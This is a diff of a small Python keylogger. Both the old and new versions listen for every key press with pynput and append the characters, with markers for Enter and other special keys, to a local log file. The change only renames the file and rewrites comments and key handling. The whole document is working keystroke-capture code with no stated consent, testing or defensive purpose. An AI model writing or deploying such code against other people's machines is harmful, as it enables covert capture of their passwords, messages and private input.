@@ -1,27 +1,24 @@
 from pynput.keyboard import Key, Listener
 
-# Define the log file where keystrokes will be saved
-log_file = "keystrokes.log"
+# Log file to store the key logs
+log_file = "keylog.log"
 
 def on_press(key):
+    """
+    Callback function to handle key press events.
+    """
     try:
-        # Handle alphanumeric keys by converting them to string
-        log_entry = str(key.char)
+        # Try to get the character of the key pressed
+        pressed_key = str(key.char)
     except AttributeError:
-        # Handle special keys by mapping them to readable strings
-        special_keys = {
-            Key.space: " ",
-            Key.enter: "[ENTER]\n",
-            Key.backspace: "[BACKSPACE]",
-            Key.esc: "[ESC]"
-        }
-        # Default to the key name in uppercase if not in special_keys
-        log_entry = special_keys.get(key, f"[{key.name.upper()}]")
+        # Handle Enter key press separately
+        if key == Key.enter: pressed_key = '[ENTER]\n'
+        else: pressed_key = f'[{key.name.upper()}]'
 
-    # Append the keystroke to the log file
-    with open(log_file, "a", encoding="utf-8") as f:
-        f.write(log_entry)
+    # Open the log file in append mode and write the pressed key
+    with open(log_file, 'a', encoding='utf-8') as f:
+        f.write(pressed_key)
 
-# Start the keyboard listener and join the thread to keep it running
+# Set up the listener to monitor key press events
 with Listener(on_press=on_press) as listener:
     listener.join()
